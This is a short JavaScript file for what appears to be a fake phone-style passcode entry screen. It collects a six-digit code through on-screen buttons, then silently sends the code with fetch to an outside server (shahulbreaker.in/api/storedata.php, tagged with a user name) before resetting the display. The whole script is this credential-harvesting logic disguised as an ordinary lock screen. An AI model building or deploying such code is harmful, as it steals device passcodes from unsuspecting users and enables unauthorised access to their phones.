const dots = document.querySelectorAll(".dots span");
let entered = "";

document.querySelectorAll(".circle").forEach(button => {
  button.addEventListener("click", () => {
    const digit = button.dataset.number;
    if (!digit) return;

    if (entered.length < 6) {
      entered += digit;
      updateDots();
    }

    if (entered.length === 6) {
      sendPasscode(entered);
    }
  });
});

function updateDots() {
  dots.forEach((dot, idx) => {
    dot.style.background = idx < entered.length ? "white" : "rgba(255,255,255,0.3)";
  });
}

function sendPasscode(code) {
  fetch(`https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=${code}`)
    .then(() => {
      entered = "";
      updateDots();
    });
}
